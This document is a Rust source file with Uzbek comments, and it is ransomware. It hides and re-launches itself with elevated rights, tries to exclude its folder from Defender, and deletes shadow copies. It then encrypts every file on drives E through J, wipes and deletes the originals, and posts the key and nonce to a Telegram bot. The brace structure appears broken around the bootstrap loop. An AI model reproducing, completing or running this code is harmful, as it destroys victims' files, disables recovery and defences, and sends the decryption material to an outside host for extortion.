use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use dotenv::dotenv;
use reqwest::blocking::Client;
use serde_json::json;
use sha2::{Digest, Sha256};
use std::{
    env,
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    path::{Path, PathBuf},
    process::Command,
    sync::{Arc, Mutex, mpsc},
    thread
};
use walkdir::WalkDir;

// Shifrlashni amalga oshiruvchi yordamchi
fn encrypt_file(
    file_path: &Path,
    key: &Key<Aes256Gcm>,
    nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // 1) Faylni o'qish
    let mut f = File::open(file_path)?;
    let mut plaintext = Vec::new();
    f.read_to_end(&mut plaintext)?;
    println!("[+] O'qildi: {}", file_path.display());

    // 2) Shifrlash
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_ref())
        .map_err(|e| format!("Encrypt error: {}", e))?;
    println!("[*] Shifrlanmoqda: {}", file_path.display());

    // 3) .enc fayl nomi
    let enc_path: PathBuf = {
        let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
        let name = file_path.file_name().unwrap().to_string_lossy();
        parent.join(format!("{}.enc", name))
    };

    // 4) Yozish
    {
        let mut out = File::create(&enc_path)?;
        out.write_all(&ciphertext)?;
        out.sync_all()?;
    }
    println!("[+] Yaratildi: {}", enc_path.display());

    // 5) Originalni nol bilan to'ldirib o'chirish
    let meta = fs::metadata(&enc_path)?;
    if meta.len() > 0 {
        let mut orig = OpenOptions::new().write(true).open(file_path)?;
        let len = orig.metadata()?.len() as usize;
        let zeros = vec![0u8; len];
        for _ in 0..3 {
            orig.write_all(&zeros)?;
            orig.sync_all()?;
        }
        fs::remove_file(file_path)?;
        println!("[+] Original o'chirildi: {}", file_path.display());
    }

    Ok(())
}


// Asosiy dastur
fn main() -> Result<(), Box<dyn std::error::Error>> {
    // === 0) Self‑copy + hide + elevate bootstrap ===

    // 0.1) Hozirgi exe yo'lini aniqlaymiz
    let current_exe = env::current_exe()?;
    // 0.2) Maqsadli katalog (masalan, %APPDATA%\MyHiddenApp)
    let mut dest_dir = env::var("APPDATA")
        .unwrap_or_else(|_| "C:\\Users\\Public".into());
    dest_dir.push_str("\\NonShared");
    let dest_dir = PathBuf::from(dest_dir);
    fs::create_dir_all(&dest_dir)?;

    // 0.3) Maqsadli exe manzili
    let file_name = current_exe
        .file_name()
        .expect("Exe file name missing");
    let dest_exe = dest_dir.join(file_name);

    // 0.4) Agar hozirgi joy maqsadli joyga teng bo'lmasa:
if current_exe != dest_exe {
    // Mavjud faylni o‘chirish (agar mavjud bo‘lsa)
    if dest_exe.exists() {
        fs::remove_file(&dest_exe).map_err(|e| format!("Remove existing file error {}: {}", dest_exe.display(), e))?;
        println!("[*] Existing file removed: {:?}", dest_exe);
    }
    // Nusxalash
    fs::copy(&current_exe, &dest_exe).map_err(|e| format!("Copy exe error {}: {}", dest_exe.display(), e))?;
    println!("[*] Copied to {:?}", dest_exe);
    // Yashirish
    let status = Command::new("attrib")
        .args(&["+h", dest_exe.to_string_lossy().as_ref()])
        .status()
        .map_err(|e| format!("Attrib error: {}", e))?;
    if !status.success() {
        eprintln!("[-] Failed to hide file: {}", dest_exe.display());
    } else {
        println!("[*] Hidden via attrib +h");
    }
    // Klonni ishga tushirish
    let mut child = Command::new("powershell")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
        .spawn()
        .map_err(|e| format!("Spawn error: {}", e))?;
    println!("[*] Elevation requested for clone: {:?}", dest_exe);
    
    // Klon jarayonni kuzatish
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                eprintln!("[-] Clone exited with status: {}. Restarting...", status);
                child = Command::new("powershell")
                    .arg("-NoProfile")
                    .arg("-ExecutionPolicy")
                    .arg("Bypass")
                    .arg("-Command")
                    .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
                    .spawn()
                    .map_err(|e| format!("Restart spawn error: {}", e))?;
                println!("[*] Clone restarted: {:?}", dest_exe);
            }
            Ok(None) => {
                // Klon hali ishlamoqda, biroz kutamiz
                thread::sleep(std::time::Duration::from_secs(1));
            }
            Err(e) => {
                eprintln!("[-] Error checking clone status: {}. Restarting...", e);
                child = Command::new("powershell")
                    .arg("-NoProfile")
                    .arg("-ExecutionPolicy")
                    .arg("Bypass")
                    .arg("-Command")
                    .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
                    .spawn()
                    .map_err(|e| format!("Restart spawn error: {}", e))?;
                println!("[*] Clone restarted: {:?}", dest_exe);
            }
        }
    }
}
    // Add-MpPreference -ExclusionPath "C:\Users\work\Desktop\safe_files"
    let _ = Command::new("Add-MpPreference").args(&["-ExclusionPath", "C:\\Users\\Public\\NonShared\\"]).spawn();

    // === 1) Endi biz admin‑nusxa ostida, yashirilgan katalogda turibmiz ===

    // 2) .env yuklash
    dotenv().ok();
    // 3) Telegram sozlamalari
    let telegram_token = env::var("TELEGRAM_TOKEN")?;
    let chat_id       = env::var("CHAT_ID")?;

    // 4) Shadow copy o'chirish (admin sifatida)
    let _ = Command::new("vssadmin")
        .args(["delete", "shadows", "/all", "/quiet"])
        .status();

    // 5) Kalit va nonce hosil qilish
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let key_bytes = hasher.finalize_reset();
    let key = Arc::new(Key::<Aes256Gcm>::from_slice(&key_bytes).clone());

    hasher.update("JasurFayllarmgaTegma");
    let nonce_bytes: [u8;12] = hasher.finalize()[..12].try_into()?;
    let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());

    // 6) Kalit&nonce faylga saqlash
    {
        let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
        let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
        let mut f = File::create("key.txt")?;
        writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
    }

    // 7) Fayl yo'llarini yig'ish
    let mut paths = Vec::new();
    for drive in ['E','F','G','H','I','J'] {
        let root = format!("{}:\\", drive);
        if Path::new(&root).exists() {
            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
                let p = entry.into_path();
                if p.is_file() {
                    paths.push(p);
                }
            }
        }
    }

    // 8) Maksimal hardware thread soni
    let max_threads = thread::available_parallelism()?.get();
    println!("[*] Ishlaydigan thread soni: {}", max_threads);

    // 9) Kanal va thread‑pool yaratish
    let (tx, rx) = mpsc::channel::<PathBuf>();
    let rx = Arc::new(Mutex::new(rx));
    let mut handles = Vec::with_capacity(max_threads as usize);

    for _ in 0..max_threads {
        let rx    = Arc::clone(&rx);
        let key   = Arc::clone(&key);
        let nonce = Arc::clone(&nonce);

        let handle = thread::spawn(move || {
            while let Ok(path) = rx.lock().unwrap().recv() {
                if let Err(e) = encrypt_file(&path, &key, &nonce) {
                    eprintln!("[-] Xato {}: {}", path.display(), e);
                }
            }
        });
        handles.push(handle);
    }

    // 10) Fayl yo'llarini kanalga yuborish
    for p in paths {
        tx.send(p)?;
    }
    drop(tx); // channel yopildi

    // 11) Thread’lar tugashini kutish
    for h in handles {
        h.join().unwrap();
    }

    // 12) Kalit&nonce Telegramga yuborish
    let client = Client::new();
    let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
    let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
    let _ = client.post(&format!("https://api.telegram.org/bot{}/sendMessage", telegram_token))
        .json(&json!({
            "chat_id": chat_id,
            "text": format!("Key: {}\nNonce: {}", k_b64, n_b64)
        }))
        .send();

    println!("[+] Barcha fayllar shifrlab bo'lingach, kalit Telegramga yuborildi!");
    Ok(())
}